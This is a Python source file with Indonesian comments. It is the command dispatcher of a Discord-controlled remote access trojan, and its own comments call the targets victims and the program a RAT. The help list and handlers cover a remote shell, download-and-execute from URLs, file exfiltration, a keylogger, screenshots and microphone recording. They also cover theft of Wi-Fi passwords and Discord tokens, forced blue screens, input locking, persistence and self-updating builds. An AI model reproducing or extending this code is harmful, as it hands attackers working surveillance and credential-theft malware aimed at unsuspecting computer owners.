"""core/cmd.py — router perintah.

Format perintah di channel:
    !a <verb> [args]           hanya mesin dengan alias a
    !<uuid> <verb> [args]      bentuk panjang, sama-sama jalan
    !* <verb> [args]           semua instance

Output selalu diprefix [alias] supaya lu bisa bedain korban.
"""

import os
import tempfile
import threading
import time

from . import caps, extra, persist, update

HELP = """verb yang ada:
info                 ringkasan mesin
ping                 latensi ke API Discord
sys                  info lengkap (alias info)
sh <cmd>             jalankan shell, cwd persist
pow <cmd>            PowerShell
cd <path>            pindah cwd
ls [path]            daftar direktori
shot                 screenshot -> attachment
dl <path>            tarik file dari korban
up <path>            lampirkan file + perintah ini, simpan ke <path>
x <url> [args]       unduh lalu jalankan program dari URL
clip                 baca clipboard
clip <text>          tulis clipboard
keys on|off|dump     keylogger
ps                   daftar proses
kill <pid>           matikan proses
taskkill <pid|nama>  sama, bisa pakai nama exe
msg <text>           messagebox
notify <text>        notifikasi tray (sama-sama tidak blocking)
tts <text>           Text-to-Speech
volume up|down|mute|0-100
mic [detik]          rekam mikrofon -> attachment WAV
block on|off         kunci keyboard+mouse (butuh admin)
rick [url]           layar penuh, rick off untuk tutup
wifi                 semua profil wifi + password
grab                 token Discord (tanpa admin, lewat DPAPI)
power reboot|shutdown|logoff
admin                minta UAC, instance baru elevated
bsod yes             bugcheck (mesin restart)
persist              pasang ulang autostart
unpersist            cabut autostart
update               ringkasan build yang sedang jalan
update <url> [sha256]  unduh build baru, verifikasi, timpa, restart
update gh <owner>/<repo> [aset] [sha256]
                     ambil aset rilis terbaru dari repo GitHub, lalu sama
sleep <detik>        jeda polling
exit                 mati (autostart tetap)
purge                hapus diri total"""


class Dispatcher:
    def __init__(self, bot, shell, keylogger, name, state):
        self.bot = bot
        self.shell = shell
        self.kl = keylogger
        self.name = name
        self.state = state

    def handle(self, msg):
        content = (msg.get("content") or "").strip()
        attachments = msg.get("attachments") or []

        if content.startswith("!"):
            head, _, body = content[1:].partition(" ")
            head = head.strip().lower()
            # Tiga bentuk: !a (alias), !<uuid penuh>, !* (semua).
            if head in ("*", "all", self.bot.uuid.lower(), self.bot.alias.lower()):
                self._dispatch(body.strip(), attachments)
            return

        # Attachment tanpa perintah = file yang nyangkut, abaikan.
        if attachments:
            self.bot.send("lampiran tanpa perintah, pakai: !%s up <path>" % self.bot.alias)

    def _dispatch(self, body, attachments):
        verb, _, arg = body.partition(" ")
        verb = verb.lower().strip()
        arg = arg.strip()

        if verb in ("help", "?"):
            return self.bot.send("alias mesin ini: !%s   (!* = semua mesin)\n%s"
                                 % (self.bot.alias, HELP))
        if verb == "info":
            return self.bot.send(caps.sysinfo())
        if verb == "sys":
            return self.bot.send(caps.sysinfo())
        if verb == "ping":
            return self.bot.send(extra.ping(self.bot))
        if verb == "sh":
            return self.bot.send(self.shell.run(arg) if arg else "[err] kosong")
        if verb in ("pow", "powershell", "ps1"):
            return self.bot.send(extra.powershell(arg) if arg else "[err] kosong")
        if verb in ("x", "exec", "run"):
            url, _, args = arg.partition(" ")
            return self.bot.send(extra.execute_url(url, args))
        if verb == "cd":
            return self.bot.send(self.shell.cd(arg))
        if verb == "ls":
            return self.bot.send(caps.listdir(arg or self.shell.cwd))
        if verb == "shot":
            return self._shot()
        if verb == "dl":
            return self._download(arg)
        if verb == "up":
            return self._upload(arg, attachments)
        if verb == "clip":
            return self.bot.send(caps.clipboard_set(arg) if arg else caps.clipboard_get())
        if verb == "keys":
            return self._keys(arg)
        if verb == "ps":
            return self.bot.send(caps.processes())
        if verb in ("kill", "taskkill"):
            return self.bot.send(extra.taskkill(arg) if verb == "taskkill" else caps.kill(arg))
        if verb == "msg":
            threading.Thread(target=caps.messagebox, args=(arg or " ",), daemon=True).start()
            return self.bot.send("ditampilkan")
        if verb == "notify":
            return self.bot.send(extra.notify(arg))
        if verb == "tts":
            return self.bot.send(extra.tts(arg))
        if verb == "volume":
            return self.bot.send(extra.volume(arg))
        if verb == "mic":
            return self._mic(arg)
        if verb == "block":
            return self.bot.send(extra.block_input(arg.strip().lower() == "on"))
        if verb == "rick":
            if arg.strip().lower() in ("off", "stop", "close"):
                return self.bot.send(extra.rick_off())
            return self.bot.send(extra.rick(arg.strip() or None))
        if verb == "wifi":
            return self.bot.send(extra.wifi())
        if verb == "grab":
            return self.bot.send(extra.grab_tokens())
        if verb == "power":
            return self.bot.send(extra.power(arg))
        if verb == "admin":
            return self.bot.send(extra.elevate())
        if verb == "bsod":
            if arg.strip().lower() != "yes":
                return self.bot.send("konfirmasi: bsod yes  (mesin langsung bugcheck)")
            return self.bot.send(extra.bsod())
        if verb == "persist":
            return self.bot.send(persist.install(self.name) or "[skip]")
        if verb == "unpersist":
            return self.bot.send(persist.remove(self.name))
        if verb == "update":
            return self._update(arg)
        if verb == "sleep":
            try:
                self.state["sleep"] = max(1.0, min(float(arg), 3600.0))
            except ValueError:
                return self.bot.send("[err] angka")
            return self.bot.send("polling %ss" % self.state["sleep"])
        if verb == "purge":
            self.bot.send(persist.purge(self.name))
            time.sleep(1)
            os._exit(0)
        if verb == "exit":
            self.bot.send("mati")
            time.sleep(1)
            os._exit(0)
        return self.bot.send("[err] verb tidak dikenal: %s" % (verb or "?"))

    def _mic(self, arg):
        """Rekaman blocking, jadi thread sendiri. Hasil selalu dilaporkan."""
        dest = os.path.join(tempfile.gettempdir(), "m_%d.wav" % int(time.time()))

        def run():
            try:
                st = extra.mic(arg or 5, dest)
                if st.startswith("MIC") and os.path.getsize(dest) > 2048:
                    self.bot.send_file(dest, st)
                else:
                    self.bot.send(st)
            except Exception as exc:
                self.bot.send("[err] mic: %s" % exc)
            finally:
                try:
                    os.remove(dest)
                except OSError:
                    pass

        threading.Thread(target=run, daemon=True).start()
        return self.bot.send("rekam %s detik..." % (arg or 5))

    def _shot(self):
        dest = os.path.join(tempfile.gettempdir(), "s_%d.png" % int(time.time()))
        try:
            caps.screenshot(dest)
            self.bot.send_file(dest, "screenshot")
        except Exception as exc:
            self.bot.send("[err] %s" % exc)
        finally:
            try:
                os.remove(dest)
            except OSError:
                pass

    def _download(self, path):
        if not path:
            return self.bot.send("[err] butuh path")
        full = os.path.abspath(os.path.join(self.shell.cwd, os.path.expanduser(path)))
        if not os.path.isfile(full):
            return self.bot.send("[err] tidak ada: %s" % full)
        size = os.path.getsize(full)
        if size > 24 * 1024 * 1024:
            return self.bot.send("[err] %d MB, di atas limit upload" % (size / 2 ** 20))
        try:
            self.bot.send_file(full, "%s (%d B)" % (os.path.basename(full), size))
        except Exception as exc:
            self.bot.send("[err] %s" % exc)

    def _upload(self, path, attachments):
        if not attachments:
            return self.bot.send("[err] lampirkan file ke pesan ini")
        if not path:
            return self.bot.send("[err] butuh path tujuan")
        dest = os.path.abspath(os.path.join(self.shell.cwd, os.path.expanduser(path)))
        os.makedirs(os.path.dirname(dest) or ".", exist_ok=True)
        try:
            self.bot.fetch(attachments[0]["url"], dest)
            self.bot.send("tersimpan: %s (%d B)" % (dest, os.path.getsize(dest)))
        except Exception as exc:
            self.bot.send("[err] %s" % exc)

    def _update(self, arg):
        """`update` tanpa arg = laporan. Dengan URL = ganti build.

        Urutan sengaja: unduh dulu, verifikasi, baru tulis skrip. Kalau
        verifikasi gagal di tengah jalan, tidak ada satu pun file yang
        tersentuh dan RAT tetap hidup dengan build lama.

        Bentuk:
            update                       ringkasan build yang jalan
            update <url> [sha256]        URL langsung
            update gh <owner>/<repo> [aset] [sha256]
                                         ambil aset rilis terbaru repo orang
        """
        parts = arg.split()
        head = parts[0].lower() if parts else ""

        if head in ("gh", "repo", "github"):
            if len(parts) < 2:
                return self.bot.send("[err] format: update gh owner/repo [aset] [sha256]")
            want = parts[2] if len(parts) > 2 else ""
            expect = parts[3].lower() if len(parts) > 3 else ""
            try:
                url, asset, size, tag = update.resolve(parts[1], want)
            except Exception as exc:
                return self.bot.send("[err] repo: %s" % exc)
            self.bot.send("repo  : %s %s\naset  : %s (%d B)\nunduh : ..."
                          % (parts[1], tag, asset, size))
            return self._swap(url, expect)

        if not head:
            return self.bot.send(update.report(self.name))

        if not head.startswith(("http://", "https://")):
            return self.bot.send("[err] butuh URL http(s) atau `gh owner/repo`")

        expect = parts[1].lower() if len(parts) > 1 else ""
        return self._swap(parts[0], expect)

    def _swap(self, url, expect):
        """Unduh, verifikasi, timpa, keluar. Dipakai oleh dua bentuk di atas."""
        files = update.targets(self.name)
        if not files:
            return self.bot.send("[err] jalan dari source, tidak ada exe untuk ditimpa")

        staged = os.path.join(tempfile.gettempdir(), "upd_%d.exe" % int(time.time()))
        try:
            self.bot.fetch(url, staged)
        except Exception as exc:
            return self.bot.send("[err] unduh: %s" % exc)

        ok, why = update.verify(staged, expect)
        if not ok:
            try:
                os.remove(staged)
            except OSError:
                pass
            return self.bot.send("[err] tolak: %s" % why)

        run = update.launch_path(self.name, files)
        script = update.apply(staged, files, run)
        if not script:
            return self.bot.send("[err] gagal menulis skrip swap")

        self.bot.send("update: %s\ntimpa: %s\nrestart: %s\nbye"
                      % (why, ", ".join(os.path.basename(f) for f in files), run))
        time.sleep(1.5)
        os._exit(0)

    def _keys(self, arg):
        arg = arg.strip().lower()
        if arg == "on":
            return self.bot.send(self.kl.start())
        if arg == "off":
            return self.bot.send(self.kl.stop())
        if arg == "dump" or not arg:
            return self.bot.send(self.kl.dump())
        return self.bot.send(HELP)
